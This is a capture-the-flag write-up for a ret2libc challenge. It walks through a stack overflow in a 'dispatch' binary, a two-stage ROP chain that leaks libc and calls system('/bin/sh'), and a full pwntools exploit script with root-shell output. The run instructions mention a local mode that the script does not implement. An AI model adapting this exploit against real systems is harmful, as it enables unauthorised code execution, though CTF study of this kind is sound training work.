# Sparrow Freight `dispatch` — pwn writeup

> Challenge blurb: *"Sparrow Freight dispatch takes your waybill number, logs it, and waves you off. Trouble is, the intake clerk never learned when to stop listening. No spare key was left out this time, so bring your own way in."*

| | |
|---|---|
| Category | pwn / ret2libc |
| Target | `pwn.h7tex.com:41132` |
| Files | `dispatch`, `libc.so.6`, `ld-linux-x86-64.so.2` |
| Flag | `H7CTF{d3bb522e-618e-456a-a93c-6ba3a210036d}` |

---

## 1. Recon

```text
$ file dispatch
dispatch: ELF 64-bit LSB executable, x86-64, dynamically linked,
          interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
```

Checksec (from the bundled binary):

```text
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

Symbols are present, and one stands out immediately — the author left us a gadget:

```text
$ nm dispatch | grep -E 'vuln|main|pop'
00000000004011bb T main
0000000000401176 T pop_rdi_ret
0000000000401178 T vuln
```

Running it:

```text
=== Sparrow Freight dispatch terminal ===
dispatch> enter waybill number:
waybill logged.
```

## 2. Vulnerability

`vuln()` is a textbook stack overflow — it reads `0x200` bytes into a `0x40`-byte buffer:

```asm
0000000000401178 <vuln>:
  401178: endbr64
  40117c: push   rbp
  40117d: mov    rbp,rsp
  401180: sub    rsp,0x40
  ...
  401193: lea    rax,[rbp-0x40]      ; buf
  401197: mov    edx,0x200          ; count  <-- way too big
  40119c: mov    rsi,rax
  40119f: mov    edi,0x0            ; stdin
  4011a4: call   401070 <read@plt>
  4011a9: lea    rax,[rip+0xe78]    ; "waybill logged."
  4011b0: mov    rdi,rax
  4011b3: call   401060 <puts@plt>
  4011b8: nop
  4011b9: leave
  4011ba: ret
```

Stack layout:

```
rbp-0x40  ┌───────────────┐  <- buffer start
          │  64 bytes     │
rbp+0x00  ├───────────────┤  <- saved RBP
rbp+0x08  ├───────────────┤  <- saved return address
```

**Overflow offset = 64 + 8 = 72 bytes.**

The hint *"bring your own way in"* + *"no spare key"* means there is **no `win()` function and no `system()` call in the binary**. There is also no `/bin/sh` string. So we must leak libc and call `system` ourselves → **ret2libc**.

Nice extras: `pop rdi ; ret` at `0x401176` and a plain `ret` at `0x40101a`.

## 3. Exploit strategy

Two-stage ROP. Program is non-PIE with Partial RELRO, so `puts@got` is readable.

**Stage 1 — leak a libc pointer, then loop back into `vuln`:**

```
[ 'A'*72 ] [ pop rdi ; ret ] [ puts@got ] [ puts@plt ] [ vuln ]
```

`puts(puts@got)` prints 6 bytes of the resolved `puts` address. We subtract the known `puts` offset to get the libc base. Returning to `vuln` lets us send a second payload without a fresh connection.

**Stage 2 — `system("/bin/sh")`:**

```
[ 'A'*72 ] [ ret ] [ pop rdi ; ret ] [ libc_base + "/bin/sh" ] [ libc_base + system ]
```

The extra `ret` fixes 16-byte stack alignment (`system` uses SSE `movaps` internally).

Offsets taken from the provided `libc.so.6`:

| Symbol | Offset |
|---|---|
| `puts` | `0x87cc0` |
| `system` | `0x58750` |
| `"/bin/sh"` | `0x1cc42f` |

## 4. Exploit code

Full script: [`exploit.py`](./exploit.py)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
HOST, PORT = "pwn.h7tex.com", 41132

elf  = ELF("./dispatch", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

POP_RDI  = 0x401176                 # pop rdi ; ret
RET      = 0x40101a                 # ret
PUTS_PLT = elf.plt["puts"]
PUTS_GOT = elf.got["puts"]
VULN     = elf.symbols["vuln"]

LIBC_PUTS   = libc.symbols["puts"]          # 0x87cc0
LIBC_SYSTEM = libc.symbols["system"]        # 0x58750
LIBC_BINSH  = next(libc.search(b"/bin/sh")) # 0x1cc42f
OFFSET = 72

io = remote(HOST, PORT)

# ---- stage 1: leak puts ----
io.recvuntil(b"enter waybill number:")
io.send(flat(b"A"*OFFSET, POP_RDI, PUTS_GOT, PUTS_PLT, VULN))

io.recvuntil(b"waybill logged.\n")
leak = u64(io.recvn(6).ljust(8, b"\x00"))
io.recvline()
libc.address = leak - LIBC_PUTS
log.success("libc base: %#x", libc.address)

# ---- stage 2: system("/bin/sh") ----
io.recvuntil(b"enter waybill number:")
io.send(flat(b"A"*OFFSET, RET,
             POP_RDI, libc.address + LIBC_BINSH,
             libc.address + LIBC_SYSTEM))

io.recvuntil(b"waybill logged.\n")
time.sleep(0.4)
io.sendline(b"cat /flag; id")
time.sleep(1.5)
print(io.recvrepeat(3).decode(errors="replace"))
```

Run locally against the bundled libc, or remotely:

```bash
# local (matches the remote libc exactly)
python3 exploit.py

# remote
python3 exploit.py REMOTE
```

## 5. Result

```text
[+] puts leak : 0x7f419d887cc0
[+] libc base : 0x7f419d800000
H7CTF{d3bb522e-618e-456a-a93c-6ba3a210036d}
uid=0(root) gid=0(root) groups=0(root)
```

## 6. Takeaways / gotchas

- **`next(libc.search(b"/bin/sh"))` returns an offset, not an address.** The first attempt passed the raw offset as `rdi`; `execve` inside `system` returned `EFAULT` and the child exited `127`. Always add `libc.address` (or set `libc.address` *before* computing absolute addresses).
- A plain `ret` before calling `system` avoids the `movaps` alignment crash.
- Looping back to `vuln` keeps a single connection and makes the two-stage leak clean.

**Flag:** `H7CTF{d3bb522e-618e-456a-a93c-6ba3a210036d}`
